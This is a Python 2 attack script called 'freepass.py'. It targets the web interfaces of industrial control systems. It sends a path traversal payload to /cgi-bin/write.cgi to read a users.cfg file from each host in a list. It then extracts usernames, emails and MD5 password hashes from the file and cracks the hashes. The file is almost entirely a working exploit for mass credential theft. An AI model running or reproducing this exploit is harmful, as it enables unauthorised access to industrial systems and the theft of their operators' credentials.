# -*- coding: utf-8 -*- 
import requests
import argparse
from breakMd5 import *
import time
import re

headers = {}

class Colors:
    BLUE 		= '\033[94m'
    GREEN 		= '\033[32m'
    RED 		= '\033[0;31m'
    DEFAULT		= '\033[0m'
    ORANGE 		= '\033[33m'
    WHITE 		= '\033[97m'
    BOLD 		= '\033[1m'
    BR_COLOUR 	= '\033[1;37;40m'



banner = '''

'''

details = '''

	Obtain and break the credentials of your industrial control system

'''
parser = argparse.ArgumentParser(prog='freepass.py',
								description=' [+] Obtain and break the credentials of your industrial control system .', 
								epilog='[+] Demo: freepass.py --list vdr_alliance/host_list.txt --port 8080',
								version="0.2")

parser.add_argument('--host', dest="HOST",  help='host')
parser.add_argument('--list', dest="HOST_LIST",  help='hosts', default=False)

parser.add_argument('--port', dest="PORT",  help='set port (default = 80)',  default="80", required=False)
#parser.add_argument('--show', dest="LEAK",  help='i wanna...',  choices=['all', 'mails', 'hash'], required=True)
#parser.add_argument('--save', dest="FILE",  help='TO json')



args        = parser.parse_args()

HST   	= args.HOST
LST   	= args.HOST_LIST
PRT 	= args.PORT
#xJson 	= args.FILE





#OPT 	= (args.LEAK).lower()

OPT = "all"

print Colors.GREEN+banner
print Colors.BLUE+details

def reqLFI(hst, prt):
	host 		= "http://"+hst+":"+prt+"/"
	fullHost 	=  "http://"+hst+":"+prt+"/cgi-bin/write.cgi"
	fullHost2 	=  "http://"+hst+":"+str(8080)+"/cgi-bin/write.cgi"

	LFI 	= "../../../../../../home/config/users.cfg"
	ContLen = str(len(LFI))

	headers["Host"] 			=  hst
	headers["User-Agent"]		= "Morzilla/7.0 (911; Pinux x86_128; rv:9743.0)"
	headers["Accept"] 			= "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" 
	headers["Content-Length"]	=  ContLen
	headers["Accept-Languag"] 	= "es-AR,en-US;q=0.7,en;q=0.3"
	headers["Referer"] 			=  fullHost
	headers["Connection"] 		= "close"
	headers["Content-Type"] 	= "application/x-www-form-urlencoded"



	print Colors.GREEN+"\n [*] HOST:\t"+Colors.ORANGE+host
	# print Colors.GREEN+"\n [*] PRODUCT:\t"+Colors.ORANGE+host


	thePost0 = "page=/&template="+LFI
	
	r0 = requests.post(fullHost, data=thePost0,headers=headers,timeout=15.000)
	users_cfg = r0.text

	return users_cfg

# ----------------------------------- #
ptrUsr =  re.compile(r"[\w.[]+[a-zA-Z0-9]+[\w.]]")

#re para strings tipo "hash md5":
ptrPass =	re.compile(r"[a-f0-9]{32}")
ptrMail = 	re.compile(r"\w+@\w+\D\w+\b")


def getTabs(nT):
	tabs = "\t"
	
	if nT < 5:	
		return tabs*3
	elif nT < 13:	
		return tabs*2
	elif nT < 21:
		tabs = (tabs)*1
		return tabs
	else:
		tabs = (tabs)*1
		return tabs



if OPT == "all":

	if LST:

		with open(LST, 'r') as LH:
			
			for nHst in LH:
				# print "== >" + nHst
				try:
					users_cfg = reqLFI(nHst[:-1], PRT)
					# ----------------------------------- #
					userList = ptrUsr.findall(users_cfg)
					hashList = ptrPass.findall(users_cfg)
					mails 	= ptrMail.findall(users_cfg)
					# ----------------------------------- #

					usersTot = len(userList) 
					credsTot = len(hashList)

					print " +---------------+-------------------------------------------------------+"
					print " | Users\t | hashes = MD5( Password + Username )\t\t\t|"	
					print " +---------------+-------------------------------------------------------+"	
							
					for nUser in range(0, usersTot):

						# -- existe un hash? ------------------------- #
						try:
							hashCred = hashList[nUser]
						except Exception:
							hashCred = " --- "
						# -- --------------- ------------------------- #
						
						username = userList[nUser]
						plane = getMD5(hashCred, username)

						print " | "+ username +  getTabs(len(username)) + hashCred +  getTabs(len(hashCred))+ "( "+plane+" )"
						
					

						#print " | "+username + ":  \t| " +hashCred + "\t|\t"+plane

					print " +------------+----------------------------------------------------------+"+Colors.DEFAULT		




				except Exception:
					print "---"
	elif HST: 

		users_cfg = reqLFI(HST, PRT)
		# ----------------------------------- #
		userList = ptrUsr.findall(users_cfg)
		hashList = ptrPass.findall(users_cfg)
		mails 	= ptrMail.findall(users_cfg)
		# ----------------------------------- #

		usersTot = len(userList) 
		credsTot = len(hashList)

		print " +---------------+-------------------------------------------------------+"
		print " | Users\t  | hashes = MD5( Password + Username )\t\t\t|"	
		print " +---------------+-------------------------------------------------------+"	
				
		for nUser in range(0, usersTot):

			# -- existe un hash? ------------------------- #
			try:
				hashCred = hashList[nUser]
			except Exception:
				hashCred = " --- "
			# -- --------------- ------------------------- #
			
			username = userList[nUser]
			plane = getMD5(hashCred, username)

			print " | "+ username +  getTabs(len(username)) + hashCred +  getTabs(len(hashCred))+ "( "+plane+" )"
			
		

			#print " | "+username + ":  \t| " +hashCred + "\t|\t"+plane

		print " +------------+----------------------------------------------------------+"+Colors.DEFAULT	
		print "\n"

	else:
		failOpt = "HOST or HOST_LIST"
		print failOpt
		exit(0)

elif (OPT == "mails"):
	print "\n"


elif (OPT == "hash"):
	#fCred = open("credenciales.txt", 'w+')
	print "hashes:"

	with open(LST, 'r') as LH:
		for nHst in LH:
			# print "== >" + nHst
			try:
				theUsrConf = reqLFI(nHst[:-1], PRT)
				# ----------------------------------- #
				hashes 	= ptrPass.findall(theUsrConf)
				# ----------------------------------- #
				for creds in hashes:
					print creds
	#				fCred.write(creds+"\n")
			except Exception:
				print "---"



# OUTPUT A UN ORDENADO Y LINDO JSON !
# EN 3.2.1

